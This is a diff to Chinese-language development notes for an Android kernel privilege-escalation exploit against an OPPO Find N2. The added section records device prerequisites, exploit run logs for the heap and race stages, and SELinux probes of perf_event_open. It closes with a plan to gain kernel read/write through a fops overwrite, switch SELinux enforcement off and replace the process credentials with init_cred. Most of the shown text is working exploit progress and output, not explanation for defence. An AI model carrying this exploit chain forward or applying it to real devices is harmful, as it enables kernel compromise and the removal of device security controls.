@@ -170,8 +170,77 @@ adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/
 adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null'
 ```
 
-## 6. 本机工具链状态
+## 6. 设备实测结果(2026-10-04,serial 84cb96e2)
 
-本机(Windows)无 clang/gcc/make/NDK。NDK r29 (windows) 已下载至
-`C:\Users\L1872\Desktop\oppo-2\android-ndk-r29-windows.zip`。
-`perf_event_open`/几何标定需设备在线(serial `84cb96e2`,已连接)。
+产物:`exploit-v29/build/oppo-find_n2/bin/preload.so`,193,240 B,
+sha256 `a0b591af7e86efb5e8f073daa9323f15c059d01f9156f96d5bcce5612bf6650e`
+(clang 21.0.0 / NDK r29 / `aarch64-linux-android35-clang`;本机无 make,见 `oppo-2/build_v29.sh`)
+
+### 6.1 设备前提(全部满足)
+
+| 项 | 实测 |
+|---|---|
+| `perf_event_paranoid` | -1 |
+| `CONFIG_FUTEX_PI` / `RT_MUTEXES` | y |
+| `CONFIG_ARM64_VA_BITS` | **39** ✔(内存布局假设成立) |
+| `CONFIG_SLUB` / `SLUB_CPU_PARTIAL` | y ✔(kmalloc 几何前提) |
+| `CONFIG_DEBUG_RT_MUTEXES` | 未设 ✔(证实 waiter=0x50,无 debug 字段) |
+| `CONFIG_CFI_CLANG` / `CFI_PERMISSIVE` | y / **未设**(CFI 强制) |
+| `/dev/ashmem`、`/sys/kernel/config` | 存在 ✔ |
+| `/proc/sys/kernel/random/boot_id` | 可读 ✔ |
+| `/proc/kallsyms` | **Permission denied**(拿不到 slide) |
+
+### 6.2 首次运行(preload 加载即跑,constructor 无门控)
+
+```
+[+] build config  label=oppo_pgu110_16.0.5.1001_cn01 slide=pselect main=pselect
+[+] p0 profile    phys_offset=80000000 kernel_phys_load=a8000000 delta=28000000
+                  init_task=ffffff802a7cc000 root_tg=ffffff802a9c8040
+[*] KernelSnitch  found 3 collisions;8 线程暴力扫 mm_struct 8 个直映射区间
+[*] mt47-c: leak pin via SCM_RIGHTS OK (fd=513)
+[*] prepare_kernel_page: SKB reclaim sends OK
+```
+→ **目标头被正确采纳,直接映射别名算对,KernelSnitch/SCM_RIGHTS/SKB 全部可用,无崩溃无重启。**
+
+### 6.3 阻塞点
+
+**(a) `perf_event_open` → EACCES。** 用 `oppo-2/perfprobe.c` 逐个配置实测:
+
+| 配置 | 结果 |
+|---|---|
+| SW_CPU_CLOCK 纯计数 | EACCES |
+| +SAMPLE_IP +exclude_kernel | **OK** |
+| +REGS_INTR +exclude_kernel | **OK** |
+| matisse 原配(REGS_INTR + exclude_user,采内核态) | **EACCES** |
+| +SAMPLE_IP(含内核态) | EACCES |
+| HW_CPU_CYCLES 纯计数 | EACCES |
+
+⇒ **SELinux 只放行 `exclude_kernel=1`(纯用户态采样)**;matisse 的 `perf_find_task` 必须采内核寄存器 ⇒ 该路线在本机被关闭。
+⇒ 改用框架自带的 **FOPS 阶段**(不需 perf):覆盖已知地址 `ASHMEM_MISC_FOPS` 拿读写原语 → 走 `init_task.tasks` 找自身 task。
+
+**(b) `pselect` 不阻塞 ⇒ 竞态窗口为零。** FOPS 阶段实跑:
+
+```
+PSELECT_SHIFT=0 tree_pc=ffffff802a91a8d9 tree_right=ffffff87c0368180
+                pi_parent=ffffff8002a41b91 target=ffffff802a91a8e8 ...
+pselect_thread returned attempt=4 ret=114 errno=0 calls=0 success=0
+pselect returned attempt=1 ret=112 errno=0 calls=0 success=0
+pipe physrw  done=0 root=0 read_ok=0 write_ok=0
+```
+`ret=112..114` = pselect 立刻返回约 112 个"就绪 fd"(而非阻塞到 2 s 超时返回 0),
+于是 `punch_consume_go` 在消费者线程看到之前就被清零 → `calls=0`,rb_erase 从未执行。
+与 matisse 的差异:fd_set 位图由**指针值**填充(`tree_pc`/`tree_right`/…),不同指针 → 不同选中的 fd 集合。
+需要在设备侧查明那 ~112 个 fd 为何被判就绪(可疑:被选中但未成功 `dup2` 的 fd 会被 select 计为 ready;
+或 `out`/`ex` 集位的语义),然后调整 `PSELECT_ROUTE_NFDS` / `shift` / 选中集合。
+
+**(c) KASLR 位置。** matisse 的 `slide_leak_kernel_base()` 是硬编码 `slide=0`(MTK 实测无随机化)。
+本机 `CONFIG_RANDOMIZE_BASE=y`。但 R/E5/C 路径只使用 `P0_DATA_ALIAS_CONST`(直接映射物理别名)
++ 运行时泄露的 task 地址 ⇒ **理论上不依赖虚拟 slide**;待 (b) 打通后由写验证(boot_id)确认。
+
+### 6.4 下一步(按优先级)
+
+1. 查明 `pselect` 立即返回的原因 → 让 `calls>0`(竞态窗口成立)。
+2. 用 `boot_id` 写验证(`PSELECT_CRED_BOOTID`)确认写原语,无需 task 地址。
+3. 写原语成立后:覆盖 `ASHMEM_MISC_FOPS` → configfs/pipe 读写 → `init_task.tasks` 按 tgid 找自身 task
+   (替代被 SELinux 关闭的 perf 泄露)。
+4. E5(enforcing 清零,`SELINUX_STATE_OFF+0`)→ C(cred → init_cred 别名)→ gate(ksud late-load)→ HOLD。
